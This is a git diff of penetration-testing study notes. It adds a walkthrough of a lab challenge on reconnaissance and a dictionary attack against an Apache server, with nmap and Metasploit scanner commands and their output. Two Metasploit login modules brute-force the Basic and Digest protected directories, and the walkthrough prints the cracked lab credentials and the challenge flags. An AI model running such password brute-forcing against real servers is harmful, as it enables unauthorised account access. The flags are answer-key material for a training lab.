@@ -276,7 +276,6 @@ nmap --script=http-webdav-scan --script-args http-methods.url-path=/webdav/ -p80
 ```
 
 ```bash
-PORT   STATE SERVICE
 80/tcp open  http
 | http-webdav-scan: 
 |   WebDAV type: Unknown
@@ -290,7 +289,204 @@ PORT   STATE SERVICE
 
 >  🔬 [Apache Recon: Dictionary Attack](https://attackdefense.pentesteracademy.com/challengedetails?cid=539)
 >
->  - Target IP: `10.4.21.207`
->  - Enumeration of an `Apache` HTTP server using `nmap` scripts
+>  - Target IP: `192.199.232.3`
+>  - Enumeration of an `Apache` HTTP server
 
-- 
+```bash
+ip -br -c a
+	eth1@if172533   UP   192.199.232.2/24 
+```
+
+```bash
+nmap -sV -sC 192.199.232.3
+```
+
+```bash
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+MAC Address: 02:42:C0:C7:E8:03 (Unknown)
+```
+
+> 📌 Running web server version is `Apache httpd 2.4.18`
+
+```bash
+curl 192.199.232.3 | more
+# or
+browsh --startup-url http://192.199.232.3
+```
+
+![curl](.gitbook/assets/image-20230216190539006.png)
+
+![browsh](.gitbook/assets/image-20230216184659611.png)
+
+> 📌 `Apache2 Ubuntu Default page` is hosted on the running web server.
+
+- Perform directories bruteforce, using the [`brute_dirs`](https://www.rapid7.com/db/modules/auxiliary/scanner/http/brute_dirs/) metasploit module. Use [robots_txt](https://www.rapid7.com/db/modules/auxiliary/scanner/http/robots_txt/) module to detect `robots.txt` files and analize its content too.
+
+```bash
+msfconsole
+```
+
+```bash
+use auxiliary/scanner/http/brute_dirs
+set RHOSTS 192.199.232.3
+exploit
+
+[*] Using code '404' as not found.
+[+] Found http://192.199.232.3:80/dir/ 401
+[+] Found http://192.199.232.3:80/poc/ 401
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+![Metasploit - brute_dirs](.gitbook/assets/image-20230216185459709.png)
+
+> 📌 `dir`, `poc` directories found.
+
+```bash
+use auxiliary/scanner/http/robots_txt
+set RHOSTS 192.199.232.3
+
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+# No /robots.txt found
+```
+
+### [curl](https://curl.se/)
+
+> **`curl`** - *command line tool and librare for transferring data with URLs*
+
+```bash
+curl http://192.199.232.3/dir
+```
+
+```html
+<title>401 Unauthorized</title>
+```
+
+![curl dir](.gitbook/assets/image-20230216185912490.png)
+
+```bash
+curl -I http://192.199.232.3/dir
+```
+
+```bash
+HTTP/1.1 401 Unauthorized
+Date: Thu, 16 Feb 2023 18:00:56 GMT
+Server: Apache/2.4.18 (Ubuntu)
+WWW-Authenticate: Basic realm="private"
+Content-Type: text/html; charset=iso-8859-1
+```
+
+> 📌 *dir* directory is using `Basic` auth protection - [WWW-Authenticate header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/WWW-Authenticate)
+
+```bash
+curl http://192.199.232.3/poc
+```
+
+```html
+<title>301 Moved Permanently</title>
+```
+
+![curl poc](.gitbook/assets/image-20230216190722430.png)
+
+- Use [`http_header`](https://www.rapid7.com/db/modules/auxiliary/scanner/http/http_header/) metasploit module to find the *poc* directory protection
+
+```bash
+msfconsole
+```
+
+```bash
+use auxiliary/scanner/http/http_header 
+set RHOSTS 192.199.232.3
+set HTTP_METHOD GET
+set TARGETURI /poc/
+exploit
+
+[+] 192.199.232.3:80     : CONTENT-TYPE: text/html; charset=iso-8859-1
+[+] 192.199.232.3:80     : SERVER: Apache/2.4.18 (Ubuntu)
+[+] 192.199.232.3:80     : WWW-AUTHENTICATE: Digest realm="Private", nonce="92BOH9X0BQA=373907c8c2a4e147272a81df61079fa305e185af", algorithm=MD5, qop="auth"
+[+] 192.199.232.3:80     : detected 3 headers
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+> 📌 *poc* directory is using `Difest` auth protection
+
+- Use [`http_login`](https://www.rapid7.com/db/modules/auxiliary/scanner/http/http_login/) metasploit module to attempt HTTP user authentication
+
+```bash
+echo -e "alice\nbob\n" > /tmp/users
+# to create "alice" and "bob" users list
+
+msfconsole
+```
+
+```bash
+use auxiliary/scanner/http/http_login 
+set RHOSTS 192.199.232.3
+set USER_FILE /tmp/users
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set AUTH_URI /dir/
+exploit
+
+[*] Attempting to login to http://192.199.232.3:80/dir/
+[+] 192.199.232.3:80 - Success: 'bob:qwerty'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+> 📌 *dir* directory credentials are `bob:qwerty`
+
+```bash
+curl -u bob:qwerty http://192.199.232.3/dir/
+```
+
+![curl -u](.gitbook/assets/image-20230216192605784.png)
+
+<details>
+<summary>Reveal Flag - dir directory flag is: 🚩</summary>
+
+`72af1d9471cfea41ac0ff3600b3702f6`
+
+</details>
+
+```bash
+msfconsole
+```
+
+```bash
+use auxiliary/scanner/http/http_login 
+set RHOSTS 192.199.232.3
+set USER_FILE /tmp/users
+set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
+set VERBOSE false
+set AUTH_URI /poc/
+exploit
+
+[*] Attempting to login to http://192.199.232.3:80/poc/
+[+] 192.199.232.3:80 - Success: 'alice:password1'
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed
+```
+
+> 📌 *poc* directory credentials are `alice:password1`
+
+```bash
+curl --digest -u alice:password1 http://192.199.232.3/poc/
+```
+
+![curl --digest -u](.gitbook/assets/image-20230216192643068.png)
+
+
+<details>
+<summary>Reveal Flag - poc directory flag is: 🚩</summary>
+
+`0b6f98199bae51afc2f60578f923f8af`
+
+</details>
+
+------
+
